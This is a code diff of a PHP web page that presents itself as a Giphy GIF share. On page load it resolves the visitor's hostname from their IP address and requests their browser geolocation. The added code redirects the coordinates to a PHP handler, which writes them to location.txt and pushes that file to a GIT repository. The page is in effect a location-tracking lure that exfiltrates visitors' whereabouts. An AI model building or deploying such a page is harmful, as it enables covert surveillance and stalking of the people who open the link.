@@ -1,39 +1,82 @@
 <!DOCTYPE html>
 <html>
 <body onload="getLocation()">
-<iframe src="https://giphy.com/embed/26ybw2WdicjAq1aco" width="480" height="326" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-<p>
-<a href="https://giphy.com/gifs/bollytc-bollywood-thumkas-26ybw2WdicjAq1aco">via GIPHY</a>
-</p>
+    <iframe src="https://giphy.com/embed/26ybw2WdicjAq1aco" width="480" height="326" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+    <p>
+        <a href="https://giphy.com/gifs/bollytc-bollywood-thumkas-26ybw2WdicjAq1aco">via GIPHY</a>
+    </p>
 
-<!-- Section to display hostname -->
-<p>
-<?php
-// Get the hostname from the visitor's IP address
-$host = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
-echo "Host: " . $host;
-?>
-</p>
+    <!-- Section to display hostname -->
+    <p>
+    <?php
+    // Get the hostname from the visitor's IP address
+    $host = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
+    echo "Host: " . $host;
+    ?>
+    </p>
 
-<!-- Section to display geolocation -->
-<p id="demo"></p>
+    <!-- Section to display geolocation -->
+    <p id="demo"></p>
 
-<script>
-const x = document.getElementById("demo");
+    <script>
+    const x = document.getElementById("demo");
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
 
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-}
-</script>
+    function showPosition(position) {
+      x.innerHTML = "Latitude: " + position.coords.latitude + 
+      "<br>Longitude: " + position.coords.longitude;
 
+      // Send the geolocation to the server via URL parameters
+      window.location.href = "yourfile.php?Latitude=" + position.coords.latitude + "&Longitude=" + position.coords.longitude;
+    }
+    </script>
 </body>
 </html>
+
+<?php
+// Check if latitude and longitude are passed as GET parameters
+if (isset($_GET['Latitude']) && isset($_GET['Longitude'])) {
+    
+    // Write content to location.txt first
+    $myfile = fopen("location.txt", "w") or die("Unable to open file!");
+    $txt = "Latitude: " . $_GET["Latitude"] . "\nLongitude: " . $_GET["Longitude"];
+    fwrite($myfile, $txt);
+    fclose($myfile);
+
+    // The file path where changes were made
+    $filePath = 'location.txt';
+
+    // Change directory to your Git repository
+    chdir('rushi8686/conversion-of-image-to-excel');
+
+    // Add the modified file to the Git staging area
+    exec("git add $filePath 2>&1", $output, $return_var);
+    if ($return_var != 0) {
+        echo "Error adding file to Git: " . implode("\n", $output);
+        exit;
+    }
+
+    // Commit the changes with a message
+    $commitMessage = "Updated location.txt via PHP";
+    exec("git commit -m '$commitMessage' 2>&1", $output, $return_var);
+    if ($return_var != 0) {
+        echo "Error committing changes: " . implode("\n", $output);
+        exit;
+    }
+
+    // Push the changes to the remote repository
+    exec("git push origin master 2>&1", $output, $return_var); // Change 'master' to your current branch if needed
+    if ($return_var != 0) {
+        echo "Error pushing to remote repository: " . implode("\n", $output);
+    } else {
+        echo "Changes pushed successfully!";
+    }
+}
+?>
